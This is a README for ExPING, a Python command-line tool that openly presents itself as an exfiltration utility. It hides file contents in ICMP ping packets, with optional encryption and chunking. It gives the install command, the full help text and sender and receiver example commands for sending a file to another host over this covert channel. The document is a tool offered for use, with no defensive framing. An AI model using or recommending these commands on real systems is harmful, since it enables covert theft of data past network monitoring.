# ExPING is a simple Python Exfiltration tool

Requires:

* Python >3.7
* Scapy
* cryptography

# Installation

` pip install exping `


# Usage:
```
usage: exping [-h] [-m MSG] [-a ADDRESS] [-c COUNT] [-i INTERVAL] [-k KEY] [-d] [-e] [-s MAX_SIZE]
              [-t {receiver,sender}] [-f FILE]

CLI util to send data in ping

optional arguments:
  -h, --help            show this help message and exit
  -m MSG, --msg MSG     Message to send in ping
  -a ADDRESS, --address ADDRESS
                        Address to send the ping
  -c COUNT, --count COUNT
                        Number of pings to send
  -i INTERVAL, --interval INTERVAL
                        Interval between pings
  -k KEY, --key KEY     Key to use for encryption
  -d, --decrypt         Decrypt the message
  -e, --encrypt         Encrypt the message
  -s MAX_SIZE, --max_size MAX_SIZE
                        Max size of the message
  -t {receiver,sender}, --type {receiver,sender}
                        Receiver or Sender, case insensitive
  -f FILE, --file FILE  File to send/receive
```

# Example

## Sender

` $> exping  -a target -f <file path> -s <chunk size> -e -k <cript key> `

## Receiver

`$> exping -a source -t receiver -f <file path> -k <cript key> `